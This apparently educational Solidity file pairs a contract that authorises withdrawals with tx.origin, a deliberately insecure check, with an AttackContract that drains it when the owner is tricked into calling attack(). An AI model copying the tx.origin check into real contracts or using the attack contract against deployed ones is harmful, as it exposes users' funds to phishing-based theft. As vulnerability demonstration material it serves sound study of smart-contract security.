// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

contract TxOrigin {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function withdraw() public {
        require(tx.origin == owner, "Not authorized");
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}

contract AttackContract {
    address public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = _vulnerableContract;
    }

    function attack() public {
        (bool success,) = vulnerableContract.call(abi.encodeWithSignature("withdraw()"));
        require(success, "Attack failed");
    }

    // Function to receive Ether
    receive() external payable {}
}
